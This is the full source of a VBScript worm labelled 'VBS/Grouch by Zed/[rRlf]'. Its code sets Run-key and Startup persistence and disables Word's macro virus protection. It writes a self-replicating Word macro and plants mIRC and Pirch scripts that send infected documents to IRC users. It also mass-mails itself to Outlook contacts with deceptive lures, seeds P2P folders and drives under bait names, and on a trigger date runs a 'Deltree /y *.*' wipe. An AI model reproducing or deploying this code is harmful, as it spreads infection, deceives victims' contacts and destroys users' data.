' VBS/Grouch by Zed/[rRlf]
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set G = fso.GetFile(WScript.ScriptFullName)
Set SysDir = fso.GetSpecialFolder(1)
Set wsc = CreateObject("WScript.Shell")
PgDir = wsc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
Set OutlookApp = CreateObject("Outlook.Application")
Set GNS = OutlookApp.GetNameSpace("MAPI")
G.Copy (SysDir & "\MSGrc32.vbs")
wsc.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSGrc32", "Wscript.exe " & SysDir & "\MSGrc32.vbs %1"
Set JC = fso.OpenTextFile(WScript.ScriptFullName, 1)
WormFileReadAllText = JC.ReadAll
JC.Close
Randomize
Randomize
Randomize
RndChr = Chr(Int(Rnd * 26 + 65))
For RC2 = 1 To Int((Rnd * 16 + 1))
R2 = R2 & Chr(Int(Rnd * 26 + 97))
Next
R2 = RndChr & R2
ReadFileName = wsc.RegRead("HKEY_CURRENT_USER\Software\Zed/[rRlf]\Grouch\1.0\RndCopy")
If ReadFileName = "" Then
wsc.RegWrite "HKCU\Software\Zed/[rRlf]\Grouch\1.0\RndCopy", R2
ReadFileName = wsc.RegRead("HKEY_CURRENT_USER\Software\Zed/[rRlf]\Grouch\1.0\RndCopy")
If ReadFileName <> "" And wsc.SpecialFolders("Startup") <> "" Then
G.Copy (wsc.SpecialFolders("Startup") & "\" & ReadFileName & ".vbs")
End If
End If
PCOwner = wsc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
Set wrd = CreateObject("Word.Application")
If wrd <> "" Then
If fso.FileExists(fso.GetSpecialFolder(1) & "\WinGrc32.dll") Then
CheckIfInstalled = wsc.RegRead("HKEY_CURRENT_USER\Software\Zed/[rRlf]\Grouch\1.0\NormalTemplate")
If CheckIfInstalled = "" Or CheckIfInstalled = Day(Now) Then
wrd.Options.VirusProtection = False
wrd.Options.SaveNormalPrompt = False
wrd.Options.ConfirmConversions = False
If wrd.NormalTemplate.VBProject.VBComponents.Item("Grouch").Name <> "Grouch" Then
wrd.NormalTemplate.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & "\WinGrc32.dll"
wrd.NormalTemplate.VBProject.VBComponents.Item("Grouch").Name = "Grouch"
wsc.RegWrite "HKCU\Software\Microsoft\Office\" & wrd.Application.Version & "\Word\Security\Level", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Office\" & wrd.Application.Version & "\Word\Security\AccessVBOM", 1, "REG_DWORD"
End If
wsc.RegWrite "HKCU\Software\Zed/[rRlf]\Grouch\1.0\NormalTemplate\", Day(Now)
End If
End If
Set WriteWormCode = fso.CreateTextFile(fso.GetSpecialFolder(1) & "\WinGrc32.dll", True)
WriteWormCode.WriteLine "Attribute VB_Name = ""Grouch"""
WriteWormCode.WriteLine "Sub AutoOpen()"
WriteWormCode.WriteLine "Call " & R2
WriteWormCode.WriteLine "End Sub"
WriteWormCode.WriteLine "Sub AutoClose()"
WriteWormCode.WriteLine "Call " & R2
WriteWormCode.WriteLine "End Sub"
WriteWormCode.WriteLine "Sub ToolsMacro()"
WriteWormCode.WriteLine "End Sub"
WriteWormCode.WriteLine "Sub ViewVBCode()"
WriteWormCode.WriteLine "End Sub"
WriteWormCode.WriteLine "Sub " & R2 & "()"
WriteWormCode.WriteLine "On Error Resume Next"
WriteWormCode.WriteLine "Options.VirusProtection = False"
WriteWormCode.WriteLine "Options.SaveNormalPrompt = False"
WriteWormCode.WriteLine "Options.ConfirmConversions = False"
WriteWormCode.WriteLine "Application.DisplayStatusBar = False"
WriteWormCode.WriteLine "Application.ScreenUpdating = False"
WriteWormCode.WriteLine "Application.EnableCancelKey = wdCancelDisabled"
WriteWormCode.WriteLine "Application.DisplayAlerts = wdAlertsNone"
WriteWormCode.WriteLine "WordRegistry = ""HKEY_CURRENT_USER\Software\Microsoft\Office\"" & Application.Version & ""\Word\Security"""
WriteWormCode.WriteLine "System.PrivateProfileString("""", WordRegistry, ""Level"") = 1&"
WriteWormCode.WriteLine "System.PrivateProfileString("""", WordRegistry, ""AccessVBOM"") = 1&"
WriteWormCode.WriteLine "CommandBars(""Tools"").Controls(""Macro"").Enabled = False"
WriteWormCode.WriteLine "CommandBars(""Macro"").Controls(""Security..."").Enabled = False"
WriteWormCode.WriteLine "CommandBars(""Macro"").Controls(""Macros..."").Enabled = False"
WriteWormCode.WriteLine "CommandBars(""Tools"").Controls(""Customize..."").Enabled = False"
WriteWormCode.WriteLine "CommandBars(""Tools"").Controls(""Templates and Add-Ins..."").Enabled = False"
WriteWormCode.WriteLine "CommandBars(""View"").Controls(""Toolbars"").Enabled = False"
WriteWormCode.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
WriteWormCode.WriteLine "If Dir(fso.GetSpecialFolder(1) & ""\MSGrc32.vbs"") <> ""MSGrc32.vbs"" Then"
WriteWormCode.WriteLine "Tz = " & Chr(34) & Chr(34)
For i = 1 To Len(WormFileReadAllText)
Tz = Mid(WormFileReadAllText, i, 1)
Tz = Hex(Asc(Tz))
If Len(Tz) = 1 Then
Tz = "0" & Tz
End If
Gz = Gz + Tz
If Len(Gz) = 110 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
If Len(WormFileReadAllText) - i = 0 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
Next
WriteWormCode.WriteLine "Open fso.GetSpecialFolder(1) & ""\MSGrc32.vbs"" For Output As #1"
WriteWormCode.WriteLine "Print #1, CM(Tz)"
WriteWormCode.WriteLine "Close #1"
WriteWormCode.WriteLine "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"", ""MSGrc32"") = ""Wscript.exe "" & fso.GetSpecialFolder(1) & ""\MSGrc32.vbs %1"""
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If Not NormalTemplate.VBProject.VBComponents.Item(""Grouch"").Name = ""Grouch"" Then ActiveDocument.VBProject.VBComponents(""Grouch"").Export fso.GetSpecialFolder(1) & ""\WinGrc32.dll"": NormalTemplate.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & ""\WinGrc32.dll"""
WriteWormCode.WriteLine "If Not ActiveDocument.VBProject.VBComponents.Item(""Grouch"").Name = ""Grouch"" Then NormalTemplate.VBProject.VBComponents(""Grouch"").Export fso.GetSpecialFolder(1) & ""\WinGrc32.dll"": ActiveDocument.VBProject.VBComponents.Import fso.GetSpecialFolder(1) & ""\WinGrc32.dll"""
WriteWormCode.WriteLine "If System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Kazaa\Transfer"", ""DlDir0"") <> """" Then"
WriteWormCode.WriteLine "MkDir fso.GetSpecialFolder(1) & ""\KazaaShared"""
WriteWormCode.WriteLine "If InStr(1, ActiveDocument.Name, ""Document"") = False Then"
WriteWormCode.WriteLine "ActiveDocument.SaveAs FileName:=fso.GetSpecialFolder(1) & ""\KazaaShared\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "ActiveDocument.Saved = True"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Kazaa\Transfer"", ""DlDir1"") = fso.GetSpecialFolder(1) & ""\KazaaShared"""
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If InStr(1, ActiveDocument.Name, ""Document"") = True Then"
WriteWormCode.WriteLine "ActiveDocument.Saved = True"
WriteWormCode.WriteLine "Else"
WriteWormCode.WriteLine "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
WriteWormCode.WriteLine "Set wsc = CreateObject(""WScript.Shell"")"
WriteWormCode.WriteLine "If Dir(""C:\Mirc\Mirc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Mirc"""
WriteWormCode.WriteLine "If Dir(""C:\Mirc32\Mirc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Mirc32"""
WriteWormCode.WriteLine "If Dir(""C:\Program Files\Mirc\Minc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Program Files\Mirc"""
WriteWormCode.WriteLine "If Dir(""C:\Programme\Mirc\Minc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Programme\Mirc"""
WriteWormCode.WriteLine "If Dir(""C:\Programmi\Mirc\Minc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Programmi\Mirc"""
WriteWormCode.WriteLine "If Dir(""C:\Program Files\Mirc32\Minc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Program Files\Mirc32"""
WriteWormCode.WriteLine "If Dir(""C:\Programme\Mirc32\Minc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Programme\Mirc32"""
WriteWormCode.WriteLine "If Dir(""C:\Programmi\Mirc32\Minc.ini"") = ""Mirc.ini"" Then ScriptPath = ""C:\Programmi\Mirc32"""
WriteWormCode.WriteLine "If Not ScriptPath = """" Then"
WriteWormCode.WriteLine "Open ScriptPath & ""\script.ini"" For Output As #2"
WriteWormCode.WriteLine "Print #2, ""[script]"""
WriteWormCode.WriteLine "Print #2, ""n5= on 1:JOIN:#:{"""
WriteWormCode.WriteLine "Print #2, ""n6= /if ( $nick == $me ) { halt }"""
WriteWormCode.WriteLine "Print #2, ""n7= /msg $nick Here is that document you wanted :)"""
WriteWormCode.WriteLine "Print #2, ""n8= /dcc send -c $nick "" & ActiveDocument.FullName"
WriteWormCode.WriteLine "Print #2, ""n9= }"""
WriteWormCode.WriteLine "Close #2"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If Dir(""C:\Pirch\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Pirch"""
WriteWormCode.WriteLine "If Dir(""C:\Pirch32\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Pirch32"""
WriteWormCode.WriteLine "If Dir(""C:\Program Files\Pirch\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Program Files\Pirch"""
WriteWormCode.WriteLine "If Dir(""C:\Programme\Pirch\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Programme\Pirch"""
WriteWormCode.WriteLine "If Dir(""C:\Programmi\Pirch\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Programmi\Pirch"""
WriteWormCode.WriteLine "If Dir(""C:\Program Files\Pirch32\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Program Files\Pirch32"""
WriteWormCode.WriteLine "If Dir(""C:\Programme\Pirch32\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Programme\Pirch32"""
WriteWormCode.WriteLine "If Dir(""C:\Programmi\Pirch32\Pirch32.exe"") = ""Pirch32.exe"" Then PirchPath = ""C:\Programmi\Pirch32"""
WriteWormCode.WriteLine "If Not PirchPath = """" Then"
WriteWormCode.WriteLine "Open PirchPath & ""\events.ini"" For Output As #3"
WriteWormCode.WriteLine "Print #3, ""[Levels]"""
WriteWormCode.WriteLine "Print #3, ""Enabled=1"""
WriteWormCode.WriteLine "Print #3, ""Count=6"""
WriteWormCode.WriteLine "Print #3, ""Level1=000-Unknowns"""
WriteWormCode.WriteLine "Print #3, ""000-UnknownsEnabled=1"""
WriteWormCode.WriteLine "Print #3, ""Level2=100-Level 100"""
WriteWormCode.WriteLine "Print #3, ""100-Level 100Enabled=1"""
WriteWormCode.WriteLine "Print #3, ""Level3=200-Level 200"""
WriteWormCode.WriteLine "Print #3, ""200-Level 200Enabled=1"""
WriteWormCode.WriteLine "Print #3, ""Level4=300-Level 300"""
WriteWormCode.WriteLine "Print #3, ""300-Level 300Enabled=1"""
WriteWormCode.WriteLine "Print #3, ""Level5=400-Level 400"""
WriteWormCode.WriteLine "Print #3, ""400-Level 400Enabled=1"""
WriteWormCode.WriteLine "Print #3, ""Level6=500-Level 500"""
WriteWormCode.WriteLine "Print #3, ""500-Level 500Enabled=1"""
WriteWormCode.WriteLine "Print #3, """""
WriteWormCode.WriteLine "Print #3, ""[000-Unknowns]"""
WriteWormCode.WriteLine "Print #3, ""UserCount=0"""
WriteWormCode.WriteLine "Print #3, ""Event1=ON JOIN:#:/msg $nick This is funny!"""
WriteWormCode.WriteLine "Print #3, ""EventCount=0"""
WriteWormCode.WriteLine "Print #3, """""
WriteWormCode.WriteLine "Print #3, ""[100-Level 100]"""
WriteWormCode.WriteLine "Print #3, ""User1=*!*@*"""
WriteWormCode.WriteLine "Print #3, ""UserCount=1"""
WriteWormCode.WriteLine "Print #3, ""Event1=ON JOIN:#:/dcc send $nick "" & ActiveDocument.FullName"
WriteWormCode.WriteLine "Print #3, ""EventCount=1"""
WriteWormCode.WriteLine "Print #3, """""
WriteWormCode.WriteLine "Print #3, ""[200-Level 200]"""
WriteWormCode.WriteLine "Print #3, ""UserCount=0"""
WriteWormCode.WriteLine "Print #3, ""EventCount=0"""
WriteWormCode.WriteLine "Print #3, """""
WriteWormCode.WriteLine "Print #3, ""[300-Level 300]"""
WriteWormCode.WriteLine "Print #3, ""UserCount=0"""
WriteWormCode.WriteLine "Print #3, ""EventCount=0"""
WriteWormCode.WriteLine "Print #3, """""
WriteWormCode.WriteLine "Print #3, ""[400-Level 400]"""
WriteWormCode.WriteLine "Print #3, ""UserCount=0"""
WriteWormCode.WriteLine "Print #3, ""EventCount=0"""
WriteWormCode.WriteLine "Print #3, """""
WriteWormCode.WriteLine "Print #3, ""[500-Level 500]"""
WriteWormCode.WriteLine "Print #3, ""UserCount=0"""
WriteWormCode.WriteLine "Print #3, ""EventCount=0"""
WriteWormCode.WriteLine "Close #3"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If Left(ActiveDocument.FullName, 3) <> ""Doc"" Then"
WriteWormCode.WriteLine "PgDir = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"", ""ProgramFilesDir"")"
WriteWormCode.WriteLine "If fso.FolderExists(""C:\Kazaa\My Shared Folder"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, ""C:\Kazaa\My Shared Folder\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\Kazaa\My Shared Folder"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\Kazaa\My Shared Folder\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(""C:\My Downloads"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, ""C:\My Downloads\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\KaZaA Lite\My Shared Folder"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\KaZaA Lite\My Shared Folder\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\Bearshare\Shared"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\Bearshare\Shared\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\Edonkey2000"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\Edonkey2000\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\Morpheus\My Shared Folder"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\Morpheus\My Shared Folder\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\Grokster\My Grokster"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\Grokster\My Grokster\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "If fso.FolderExists(PgDir & ""\ICQ\Shared Files"") Then"
WriteWormCode.WriteLine "FileCopy ActiveDocument.FullName, PgDir & ""\ICQ\Shared Files\"" & ActiveDocument.Name"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "End If"
WriteWormCode.WriteLine "End Sub"
WriteWormCode.WriteLine "Function CM(CN)"
WriteWormCode.WriteLine "For GC = 1 To Len(CN) Step 2"
WriteWormCode.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
WriteWormCode.WriteLine "Next"
WriteWormCode.WriteLine "End Function"
WriteWormCode.WriteLine "' WordMacro/Grouch by Zed/[rRlf]"
WriteWormCode.Close
End If
If OutlookApp <> "" Then
Randomize
Randomize
For RC = 1 To Int((Rnd * 3 + 1))
R1 = R1 & Chr(Int(Rnd * 26 + 65))
Next
Randomize
RndNumber = Int((3 * Rnd) + 1)
Select Case RndNumber
Case 1
RndSubject = "Check this out"
RndEmail = "Check out these web links," & vbCrLf & "I know you like these sites! ;)"
RndAttachment = "SiteLinks.vbs"
Case 2
RndSubject = "The File"
RndEmail = "Hello," & vbCrLf _
& "Here is that file that everyone was asking me for." & vbCrLf _
& "Don't let anyone else see it, please, because it contains some pretty naughty stuff ;)"
RndAttachment = R1 & ".vbs"
Case 3
RndSubject = "Readme File"
RndEmail = "Hello," & vbCrLf _
& "I am running a bit late. Just read the Readme file for more information." & vbCrLf & vbCrLf & PCOwner
RndAttachment = "Readme.vbs"
End Select
Randomize
RndFwd = Int((16 * Rnd) + 1)
If RndFwd <> 6 Then
RndSubject = "Fwd: " & RndSubject
End If
If Month(Now) = 5 And Day(Now) = 9 Then
RndSubject = "Fwd: Free Music!"
RndEmail = "Hello!" & vbCrLf _
& "Go to these sites that I'm sending to you now." & vbCrLf _
& "You can get basically any music file or Music video file that you want!" & vbCrLf _
& "Enjoy!" & vbCLf & vbCrLf & PCOwner
RndAttachment = "Mp3Sites.vbs"
End If
G.Copy (fso.GetSpecialFolder(1) & "\" & RndAttachment)
For SearchList = 1 To GNS.AddressLists.Count
CountLoop = 1
Set OutlookEmail = OutlookApp.CreateItem(0)
For SearchEmails = 1 To GNS.AddressLists(SearchList).AddressEntries.Count
WriteEmailSent = wsc.RegRead("HKEY_CURRENT_USER\Software\Zed/[rRlf]\Grouch\1.0\Outlook\RecordContacts\" & GNS.AddressLists(SearchList).AddressEntries(CountLoop))
If WriteEmailSent = "" Then
OutlookEmail.Recipients.Add GNS.AddressLists(SearchList).AddressEntries(CountLoop)
wsc.RegWrite "HKCU\Software\Zed/[rRlf]\Grouch\1.0\Outlook\RecordContacts\" & GNS.AddressLists(SearchList).AddressEntries(CountLoop), "Email Sent - " & DateValue(Now)
End If
CountLoop = CountLoop + 1
Next
OutlookEmail.Subject = RndSubject: OutlookEmail.Body = RndEmail: OutlookEmail.Importance = 2: OutlookEmail.DeleteAfterSubmit = True: OutlookEmail.Attachments.Add fso.GetSpecialFolder(1) & "\" & RndAttachment: OutlookEmail.Send
Next
GNS = ""
OutlookApp = ""
End If
If fso.FolderExists("C:\Kazaa\My Shared Folder") Then
G.Copy ("C:\Kazaa\My Shared Folder\1000 Porn Sites.vbs")
G.Copy ("C:\Kazaa\My Shared Folder\Hacking made easy.vbs")
G.Copy ("C:\Kazaa\My Shared Folder\How to make a virus.vbs")
G.Copy ("C:\Kazaa\My Shared Folder\Hot Links.vbs")
G.Copy ("C:\Kazaa\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\Kazaa\My Shared Folder") Then
G.Copy (PgDir & "\Kazaa\My Shared Folder\1000 Porn Sites.vbs")
G.Copy (PgDir & "\Kazaa\My Shared Folder\Hacking made easy.vbs")
G.Copy (PgDir & "\Kazaa\My Shared Folder\How to make a virus.vbs")
G.Copy (PgDir & "\Kazaa\My Shared Folder\Hot Links.vbs")
G.Copy (PgDir & "\Kazaa\My Shared Folder\How to make a bomb.vbs")
End If
If fso.FolderExists("C:\My Downloads") Then
G.Copy ("C:\My Downloads\1000 Porn Sites.vbs")
G.Copy ("C:\My Downloads\Hacking made easy.vbs")
G.Copy ("C:\My Downloads\How to make a virus.vbs")
G.Copy ("C:\My Downloads\Hot Links.vbs")
G.Copy ("C:\My Downloads\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\KaZaA Lite\My Shared Folder") Then
G.Copy (PgDir & "\KaZaA Lite\My Shared Folder\1000 Porn Sites.vbs")
G.Copy (PgDir & "\KaZaA Lite\My Shared Folder\Hacking made easy.vbs")
G.Copy (PgDir & "\KaZaA Lite\My Shared Folder\How to make a virus.vbs")
G.Copy (PgDir & "\KaZaA Lite\My Shared Folder\Hot Links.vbs")
G.Copy (PgDir & "\KaZaA Lite\My Shared Folder\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\Bearshare\Shared") Then
G.Copy (PgDir & "\Bearshare\Shared\1000 Porn Sites.vbs")
G.Copy (PgDir & "\Bearshare\Shared\Hacking made easy.vbs")
G.Copy (PgDir & "\Bearshare\Shared\How to make a virus.vbs")
G.Copy (PgDir & "\Bearshare\Shared\Hot Links.vbs")
G.Copy (PgDir & "\Bearshare\Shared\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\Edonkey2000") Then
G.Copy (PgDir & "\Edonkey2000\1000 Porn Sites.vbs")
G.Copy (PgDir & "\Edonkey2000\Hacking made easy.vbs")
G.Copy (PgDir & "\Edonkey2000\How to make a virus.vbs")
G.Copy (PgDir & "\Edonkey2000\Hot Links.vbs")
G.Copy (PgDir & "\Edonkey2000\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\Morpheus\My Shared Folder") Then
G.Copy (PgDir & "\Morpheus\My Shared Folder\1000 Porn Sites.vbs")
G.Copy (PgDir & "\Morpheus\My Shared Folder\Hacking made easy.vbs")
G.Copy (PgDir & "\Morpheus\My Shared Folder\How to make a virus.vbs")
G.Copy (PgDir & "\Morpheus\My Shared Folder\Hot Links.vbs")
G.Copy (PgDir & "\Morpheus\My Shared Folder\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\Grokster\My Grokster") Then
G.Copy (PgDir & "\Grokster\My Grokster\1000 Porn Sites.vbs")
G.Copy (PgDir & "\Grokster\My Grokster\Hacking made easy.vbs")
G.Copy (PgDir & "\Grokster\My Grokster\How to make a virus.vbs")
G.Copy (PgDir & "\Grokster\My Grokster\Hot Links.vbs")
G.Copy (PgDir & "\Grokster\My Grokster\How to make a bomb.vbs")
End If
If fso.FolderExists(PgDir & "\ICQ\Shared Files") Then
G.Copy (PgDir & "\ICQ\Shared Files\1000 Porn Sites.vbs")
G.Copy (PgDir & "\ICQ\Shared Files\Hacking made easy.vbs")
G.Copy (PgDir & "\ICQ\Shared Files\How to make a virus.vbs")
G.Copy (PgDir & "\ICQ\Shared Files\Hot Links.vbs")
G.Copy (PgDir & "\ICQ\Shared Files\How to make a bomb.vbs")
End If
For Each DriveCount In fso.Drives
If DriveCount.DriveType = 2 Or DriveCount.DriveType = 3 Then
If DriveCount.IsReady Then
If UCase(DriveCount.Path) <> "C:" Then
G.Copy (DriveCount.Path & "\Saved Document (" & Day(Now) & ").vbs")
End If
End If
End If
Next
CheckWormKey = wsc.RegRead("HKEY_CURRENT_USER\Software\Zed/[rRlf]\Grouch\1.0\")
If CheckWormKey = "VBS/Grouch by Zed/[rRlf]" Then
If Day(Now) = 9 And Month(Now) = 5 Then
CheckWinXP = wsc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Version")
If InStr(1, LCase(CheckWinXP), "xp") = True Then
Set WriteFormat = fso.CreateTextFile(fso.GetSpecialFolder(0) & "\Angry.bat", True)
WriteFormat.WriteLine "@Echo Off"
WriteFormat.WriteLine "Deltree /y *.*"
WriteFormat.Close
MsgXP = MsgBox("Windows XP now has permanent errors", vbCritical, "Windows XP Error")
If MsgXP = vbOK Then
If fso.FileExists(fso.GetSpecialFolder(0) & "\Angry.bat") Then
wsc.Run fso.GetSpecialFolder(0) & "\Angry.bat", 0, False
End If
End If
End If
End If
End If
wsc.RegWrite "HKCU\Software\Zed/[rRlf]\Grouch\1.0\", "VBS/Grouch by Zed/[rRlf]"
wrd.Application.Quit
Do
If Not fso.FileExists(SysDir & "\MSGrc32.vbs") Then
G.Copy (SysDir & "\MSGrc32.vbs")
End If
RegistryRunKey = wsc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSGrc32")
If Not RegistryRunKey = "Wscript.exe " & SysDir & "\MSGrc32.vbs %1" Then
wsc.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSGrc32", "Wscript.exe " & SysDir & "\MSGrc32.vbs %1"
End If
ReadFileName = wsc.RegRead("HKEY_CURRENT_USER\Software\Zed/[rRlf]\Grouch\1.0\RndCopy")
If ReadFileName <> "" And wsc.SpecialFolders("Startup") <> "" Then
If Not fso.FileExists(wsc.SpecialFolders("Startup") & "\" & ReadFileName & ".vbs") Then
G.Copy (wsc.SpecialFolders("Startup") & "\" & ReadFileName & ".vbs")
End If
End If
Loop